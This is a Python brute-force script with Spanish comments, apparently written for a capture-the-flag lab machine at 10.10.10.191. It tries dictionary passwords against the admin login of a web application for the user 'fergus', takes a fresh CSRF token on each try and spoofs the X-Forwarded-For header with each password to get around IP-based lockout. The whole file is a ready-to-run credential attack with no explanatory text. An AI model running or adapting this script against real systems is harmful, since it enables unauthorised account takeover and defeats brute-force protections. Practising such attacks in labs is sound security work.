``` python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import re

from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)
	
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.191/admin"

def makeRequest():
	
	s = requests.session()
	
	f = open("diccionario.txt", "r")
	
	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	time.sleep(2)
	
	for password in f.readlines():
		
		response = s.get(main_url)
		tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', response.text)[0]
	
		data_post = {
			'tokenCSRF': tokenCSRF,
			'username': 'fergus',
			'password': '%s' % password.strip('\n')		
		}
		
		headers_login = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
			'Referer': 'http://10.10.10.191/admin/login',
			'X-Forwarded-For': '%s' % password.strip('\n')
		}
		
		p1.status("Probando con la contraseña %s" % password.strip("\n"))
		
		r = s.post(main_url, data=data_post, headers=headers_login)
		
		if "Username or password incorrecta" not in r.text:
			p1.success("La contraseña es %s" % password.strip("\n"))
			sys.exit(0)
			
if __name__ == '__main__':
	
	makeRequest()

```